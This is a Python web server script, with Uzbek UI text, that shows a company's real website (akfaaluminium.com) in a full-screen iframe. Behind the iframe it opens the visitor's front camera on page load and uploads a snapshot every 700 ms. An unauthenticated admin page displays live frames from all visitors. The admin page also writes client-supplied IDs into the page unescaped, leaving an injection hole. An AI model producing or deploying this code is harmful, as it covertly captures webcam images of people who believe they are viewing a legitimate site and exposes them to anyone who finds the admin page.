import base64
import json
import threading
import time
import uuid
import webbrowser
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse, parse_qs

HOST = "0.0.0.0"
PORT = 8000

clients = {}
clients_lock = threading.Lock()


INDEX_HTML = """
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AKFA + Camera</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
        html, body { width: 100%; height: 100%; overflow: hidden; background: #000; }

        #siteFrame {
            position: fixed;
            inset: 0;
            width: 100%;
            height: 100%;
            border: none;
            background: #fff;
            z-index: 1;
        }

        #cameraBox {
            position: fixed;
            right: 20px;
            bottom: 20px;
            width: 260px;
            height: 180px;
            background: #000;
            border: 2px solid #fff;
            border-radius: 16px;
            overflow: hidden;
            z-index: -1;
            box-shadow: 0 10px 30px rgba(0,0,0,0.35);
        }

        #preview {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
            background: #000;
        }

        #status {
            position: fixed;
            left: 20px;
            bottom: 20px;
            z-index: 9999;
            background: rgba(0,0,0,0.75);
            color: #fff;
            padding: 10px 14px;
            border-radius: 10px;
            font-size: 14px;
        }

        #topBar {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 9999;
            display: flex;
            gap: 10px;
        }

        .btn {
            text-decoration: none;
            color: white;
            background: rgba(0,0,0,0.7);
            padding: 10px 14px;
            border-radius: 10px;
            font-size: 14px;
            border: 1px solid rgba(255,255,255,0.15);
        }

        .btn:hover {
            background: rgba(0,0,0,0.85);
        }
    </style>
</head>
<body>
    <iframe id="siteFrame" src="https://akfaaluminium.com/"></iframe>

    <div id="topBar">
        <a class="btn" href="/admin" target="_blank">Admin panel</a>
    </div>

    <div id="cameraBox">
        <video id="preview" autoplay playsinline muted></video>
    </div>

    <div id="status">Kamera ishga tushmoqda...</div>

    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const statusBox = document.getElementById("status");
        const preview = document.getElementById("preview");
        const canvas = document.getElementById("canvas");
        const ctx = canvas.getContext("2d");

        const clientId = localStorage.getItem("camera_client_id") || crypto.randomUUID();
        localStorage.setItem("camera_client_id", clientId);

        let stream = null;
        let sending = false;

        async function startCamera() {
            try {
                statusBox.textContent = "Kamera ishga tushmoqda...";

                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: "user",
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                preview.srcObject = stream;
                await preview.play();

                statusBox.textContent = "Kamera faol";
                startSendingFrames();
            } catch (err) {
                console.error(err);
                statusBox.textContent = "Kamera ruxsati berilmadi yoki kamera ochilmadi";
            }
        }

        async function sendFrame() {
            if (!stream || preview.readyState < 2 || sending) return;

            sending = true;
            try {
                ctx.drawImage(preview, 0, 0, canvas.width, canvas.height);
                const dataUrl = canvas.toDataURL("image/jpeg", 0.7);

                await fetch("/api/frame", {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        client_id: clientId,
                        image: dataUrl
                    })
                });
            } catch (err) {
                console.error("Frame yuborishda xatolik:", err);
            } finally {
                sending = false;
            }
        }

        function startSendingFrames() {
            sendFrame();
            setInterval(sendFrame, 700);
        }

        window.addEventListener("load", startCamera);
    </script>
</body>
</html>
"""


ADMIN_HTML = """
<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <style>
        * { box-sizing: border-box; font-family: Arial, sans-serif; }
        body { margin: 0; background: #0f172a; color: white; min-height: 100vh; }
        .wrap { max-width: 1300px; margin: 0 auto; padding: 24px; }
        .header {
            display: flex; justify-content: space-between; align-items: center;
            gap: 12px; margin-bottom: 20px; flex-wrap: wrap;
        }
        h1 { margin: 0; font-size: 28px; }
        .btn {
            text-decoration: none; color: white; background: #1e293b;
            padding: 10px 14px; border-radius: 10px; border: 1px solid #334155;
        }
        .btn:hover { background: #334155; }
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
            gap: 20px;
        }
        .card {
            background: #1e293b;
            border-radius: 18px;
            padding: 18px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.25);
        }
        .card h2 { margin: 0 0 14px 0; font-size: 20px; }
        .feed {
            width: 100%;
            height: 260px;
            object-fit: cover;
            border-radius: 14px;
            display: block;
            background: #000;
            border: 1px solid #334155;
        }
        .muted { color: #94a3b8; font-size: 14px; margin-top: 10px; }
        .empty {
            padding: 30px; text-align: center; border: 1px dashed #475569;
            border-radius: 14px; color: #94a3b8;
        }
    </style>
</head>
<body>
    <div class="wrap">
        <div class="header">
            <h1>Admin Panel</h1>
            <div>
                <a class="btn" href="/">Asosiy sahifa</a>
            </div>
        </div>

        <div id="grid" class="grid"></div>
    </div>

    <script>
        async function loadClients() {
            try {
                const res = await fetch("/api/clients");
                const data = await res.json();
                const grid = document.getElementById("grid");

                if (!data.clients || data.clients.length === 0) {
                    grid.innerHTML = '<div class="empty">Hozircha aktiv kamera yo‘q</div>';
                    return;
                }

                grid.innerHTML = data.clients.map(client => `
                    <div class="card">
                        <h2>Client: ${client.client_id}</h2>
                        <img class="feed" src="${client.image}" alt="camera frame" />
                        <div class="muted">Oxirgi update: ${client.updated_at}</div>
                    </div>
                `).join("");
            } catch (err) {
                console.error(err);
            }
        }

        loadClients();
        setInterval(loadClients, 1000);
    </script>
</body>
</html>
"""


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)

        if parsed.path == "/":
            self._send_html(INDEX_HTML)
            return

        if parsed.path == "/admin":
            self._send_html(ADMIN_HTML)
            return

        if parsed.path == "/api/clients":
            self._send_clients()
            return

        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"404 Not Found")

    def do_POST(self):
        parsed = urlparse(self.path)

        if parsed.path == "/api/frame":
            self._receive_frame()
            return

        self.send_response(404)
        self.end_headers()
        self.wfile.write(b"404 Not Found")

    def _send_html(self, html):
        data = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def _send_json(self, payload, code=200):
        data = json.dumps(payload).encode("utf-8")
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(data)

    def _receive_frame(self):
        try:
            content_length = int(self.headers.get("Content-Length", "0"))
            raw = self.rfile.read(content_length)
            body = json.loads(raw.decode("utf-8"))

            client_id = body.get("client_id")
            image = body.get("image")

            if not client_id or not image:
                self._send_json({"ok": False, "error": "client_id yoki image yo‘q"}, 400)
                return

            with clients_lock:
                clients[client_id] = {
                    "client_id": client_id,
                    "image": image,
                    "updated_at": time.strftime("%Y-%m-%d %H:%M:%S")
                }

            self._send_json({"ok": True})
        except Exception as e:
            self._send_json({"ok": False, "error": str(e)}, 500)

    def _send_clients(self):
        now = time.time()

        with clients_lock:
            expired = []
            result = []

            for client_id, data in clients.items():
                result.append(data)

            result.sort(key=lambda x: x["updated_at"], reverse=True)

        self._send_json({"clients": result})

    def log_message(self, format, *args):
        return


def open_browser():
    try:
        webbrowser.open(f"http://127.0.0.1:{PORT}/")
    except Exception:
        pass


def run():
        server = ThreadingHTTPServer((HOST, PORT), MyHandler)
        print(f"Server ishga tushdi: http://127.0.0.1:{PORT}/")
        print(f"Admin panel: http://127.0.0.1:{PORT}/admin")

        threading.Timer(1.0, open_browser).start()

        try:
            server.serve_forever()
        except KeyboardInterrupt:
            print("\\nServer to'xtatildi.")
        finally:
            server.server_close()


if __name__ == "__main__":
    run()
